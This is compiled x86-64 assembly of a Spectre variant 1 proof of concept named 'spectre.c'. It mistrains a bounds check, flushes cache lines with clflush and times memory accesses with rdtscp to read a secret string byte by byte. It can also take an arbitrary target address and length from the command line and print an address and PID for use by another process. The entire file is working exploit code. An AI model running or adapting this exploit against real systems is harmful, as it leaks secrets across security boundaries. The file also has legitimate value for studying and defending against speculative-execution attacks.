	.file	"spectre.c"
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	endbr64
	movslq	array1_size(%rip), %rax
	cmpq	%rdi, %rax
	seta	%al
	movzbl	%al, %eax
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.p2align 4
	.globl	leak_data
	.type	leak_data, @function
leak_data:
.LFB5690:
	.cfi_startproc
	endbr64
	movq	(%rdi), %rdx
	movslq	array1_size(%rip), %rax
	cmpq	%rax, %rdx
	jnb	.L3
	leaq	array1(%rip), %rax
	movzbl	(%rax,%rdx), %eax
	leaq	array2(%rip), %rdx
	sall	$9, %eax
	cltq
	movzbl	(%rdx,%rax), %eax
	andb	%al, temp(%rip)
.L3:
	ret
	.cfi_endproc
.LFE5690:
	.size	leak_data, .-leak_data
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5691:
	.cfi_startproc
	endbr64
	subq	$8, %rsp
	.cfi_def_cfa_offset 16
	movq	%rdi, (%rsp)
	movq	%rsp, %rdi
	call	leak_data
	addq	$8, %rsp
	.cfi_def_cfa_offset 8
	ret
	.cfi_endproc
.LFE5691:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5692:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	leaq	results.0(%rip), %r10
	movl	$128, %ecx
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	movl	$2863311531, %r14d
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	leaq	array1(%rip), %r13
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	leaq	array2(%rip), %r12
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	leaq	131072(%r12), %rbp
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	movl	$999, %ebx
	subq	$56, %rsp
	.cfi_def_cfa_offset 112
	movq	%rdi, 8(%rsp)
	movq	%r10, %rdi
	leaq	32(%rsp), %r11
	movq	%rsi, 16(%rsp)
	movq	%rdx, 24(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 40(%rsp)
	xorl	%eax, %eax
	movl	$0, 32(%rsp)
	rep stosq
.L8:
	leaq	array2(%rip), %rax
	.p2align 4,,10
	.p2align 3
.L9:
	clflush	(%rax)
	addq	$512, %rax
	cmpq	%rbp, %rax
	jne	.L9
	movl	array1_size(%rip), %esi
	movl	%ebx, %eax
	movl	$29, %r9d
	cltd
	idivl	%esi
	movq	8(%rsp), %rsi
	movslq	%edx, %rcx
	xorq	%rcx, %rsi
	.p2align 4,,10
	.p2align 3
.L11:
	clflush	array1_size(%rip)
	movl	$0, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jg	.L13
	.p2align 4,,10
	.p2align 3
.L10:
	movl	36(%rsp), %eax
	addl	$1, %eax
	movl	%eax, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jle	.L10
.L13:
	movl	%r9d, %eax
	imulq	%r14, %rax
	shrq	$34, %rax
	leal	(%rax,%rax,2), %edx
	movl	%r9d, %eax
	addl	%edx, %edx
	subl	%edx, %eax
	subl	$1, %eax
	xorw	%ax, %ax
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%rsi, %rdi
	xorq	%rcx, %rdi
	call	victim_function
	subl	$1, %r9d
	jnb	.L11
	movl	$13, %esi
	.p2align 4,,10
	.p2align 3
.L12:
	movzbl	%sil, %r8d
	movl	%r8d, %r15d
	sall	$9, %r15d
	rdtscp
	movq	%rax, %rdi
	salq	$32, %rdx
	movslq	%r15d, %r15
	movl	%ecx, (%r11)
	orq	%rdx, %rdi
	movzbl	(%r12,%r15), %eax
	rdtscp
	salq	$32, %rdx
	movl	%ecx, (%r11)
	orq	%rdx, %rax
	subq	%rdi, %rax
	cmpq	$100, %rax
	ja	.L14
	movl	%ebx, %eax
	movl	array1_size(%rip), %ecx
	cltd
	idivl	%ecx
	movslq	%edx, %rdx
	movzbl	0(%r13,%rdx), %eax
	cmpl	%r8d, %eax
	je	.L14
	addl	$1, (%r10,%r8,4)
.L14:
	addl	$167, %esi
	cmpl	$42765, %esi
	jne	.L12
	movl	$1, %eax
	xorl	%ecx, %ecx
	xorl	%edx, %edx
	jmp	.L15
	.p2align 4,,10
	.p2align 3
.L37:
	cmpl	$-1, %r9d
	je	.L22
	movslq	%r9d, %rdi
	cmpl	(%r10,%rdi,4), %esi
	cmovge	%eax, %r9d
.L16:
	addq	$1, %rax
.L15:
	movl	(%r10,%rdx,4), %edi
	cmpq	$256, %rax
	je	.L36
	movl	(%r10,%rax,4), %esi
	cmpl	%edi, %esi
	jl	.L37
	movslq	%eax, %rdx
	movl	%ecx, %r9d
	movq	%rdx, %rcx
	jmp	.L16
	.p2align 4,,10
	.p2align 3
.L22:
	movl	%eax, %r9d
	jmp	.L16
.L36:
	movslq	%r9d, %rsi
	movl	(%r10,%rsi,4), %eax
	leal	4(%rax,%rax), %r8d
	cmpl	%edi, %r8d
	jl	.L18
	cmpl	$2, %edi
	jne	.L23
	testl	%eax, %eax
	je	.L18
.L23:
	subl	$1, %ebx
	jne	.L8
.L18:
	movq	16(%rsp), %rbx
	movl	results.0(%rip), %eax
	xorl	32(%rsp), %eax
	movl	%eax, results.0(%rip)
	movb	%cl, (%rbx)
	movq	24(%rsp), %rcx
	movl	(%r10,%rdx,4), %eax
	movl	%eax, (%rcx)
	movb	%r9b, 1(%rbx)
	movl	(%r10,%rsi,4), %eax
	movl	%eax, 4(%rcx)
	movq	40(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L38
	addq	$56, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L38:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.8
	.align 8
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5693:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	subq	$72, %rsp
	.cfi_def_cfa_offset 128
	movl	%edi, 4(%rsp)
	movq	%rsi, 8(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 56(%rsp)
	xorl	%eax, %eax
.L40:
	movq	stdin(%rip), %rdi
	call	getc@PLT
	cmpb	$114, %al
	je	.L58
.L41:
	cmpb	$10, %al
	je	.L40
	cmpb	$105, %al
	jne	.L50
	xorl	%eax, %eax
	call	getpid@PLT
	movl	$1, %edi
	leaq	33+check(%rip), %rdx
	leaq	.LC12(%rip), %rsi
	movl	%eax, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movq	stdin(%rip), %rdi
	call	getc@PLT
	cmpb	$114, %al
	jne	.L41
.L58:
	movq	secret(%rip), %rdx
	leaq	.LC2(%rip), %rsi
	movl	$1, %edi
	xorl	%eax, %eax
	leaq	array1(%rip), %rbx
	movq	%rdx, %rcx
	call	__printf_chk@PLT
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	subq	%rbx, %rax
	movq	%rax, 32(%rsp)
	call	strlen@PLT
	movl	$131072, %edx
	movl	$1, %esi
	leaq	array2(%rip), %rdi
	movl	%eax, 28(%rsp)
	movl	%eax, %r12d
	call	memset@PLT
	cmpl	$3, 4(%rsp)
	je	.L59
.L42:
	xorl	%eax, %eax
	movl	%r12d, %edx
	movl	$1, %edi
	leaq	.LC6(%rip), %rsi
	call	__printf_chk@PLT
	subl	$1, 28(%rsp)
	js	.L40
	xorl	%ebx, %ebx
	leaq	44(%rsp), %r14
	leaq	.LC7(%rip), %r15
	leaq	54(%rsp), %r13
	leaq	.LC8(%rip), %r12
	.p2align 4,,10
	.p2align 3
.L43:
	movq	secret(%rip), %rax
	movq	32(%rsp), %rdx
	movq	%r15, %rsi
	movl	$1, %edi
	movsbl	(%rax,%rbx), %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movq	32(%rsp), %rdi
	movq	%r14, %rdx
	movq	%r13, %rsi
	leaq	1(%rdi), %rax
	movq	%rax, 32(%rsp)
	call	readMemoryByte
	movl	48(%rsp), %ebp
	movl	44(%rsp), %r8d
	movq	%r12, %rsi
	leaq	.LC1(%rip), %rdx
	movl	$1, %edi
	leal	(%rbp,%rbp), %eax
	movl	%r8d, (%rsp)
	cmpl	%eax, %r8d
	leaq	.LC0(%rip), %rax
	cmovge	%rax, %rdx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movzbl	54(%rsp), %edx
	movl	(%rsp), %r8d
	movl	$63, %ecx
	leaq	.LC9(%rip), %rsi
	movl	$1, %edi
	movl	%edx, %eax
	subl	$32, %eax
	cmpb	$95, %al
	cmovb	%edx, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	testl	%ebp, %ebp
	jle	.L47
	movzbl	55(%rsp), %edx
	movl	$63, %ecx
	movl	%ebp, %r8d
	leaq	.LC10(%rip), %rsi
	movl	$1, %edi
	movl	%edx, %eax
	subl	$32, %eax
	cmpb	$95, %al
	cmovb	%edx, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
.L47:
	leaq	.LC11(%rip), %rsi
	movl	$1, %edi
	xorl	%eax, %eax
	addq	$1, %rbx
	call	__printf_chk@PLT
	movl	28(%rsp), %eax
	subl	$1, %eax
	movl	%eax, 28(%rsp)
	testl	%eax, %eax
	jns	.L43
	jmp	.L40
.L50:
	movq	56(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L60
	addq	$72, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	xorl	%eax, %eax
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L59:
	.cfi_restore_state
	movq	8(%rsp), %r15
	leaq	32(%rsp), %rdx
	leaq	.LC3(%rip), %rsi
	xorl	%eax, %eax
	movq	8(%r15), %rdi
	call	__isoc99_sscanf@PLT
	movq	16(%r15), %rdi
	leaq	28(%rsp), %rdx
	xorl	%eax, %eax
	leaq	.LC4(%rip), %rsi
	subq	%rbx, 32(%rsp)
	call	__isoc99_sscanf@PLT
	movl	28(%rsp), %ecx
	movq	32(%rsp), %rdx
	xorl	%eax, %eax
	leaq	.LC5(%rip), %rsi
	movl	$1, %edi
	call	__printf_chk@PLT
	movl	28(%rsp), %r12d
	jmp	.L42
.L60:
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5693:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.8
	.align 8
.LC13:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC13
	.globl	array2
	.bss
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
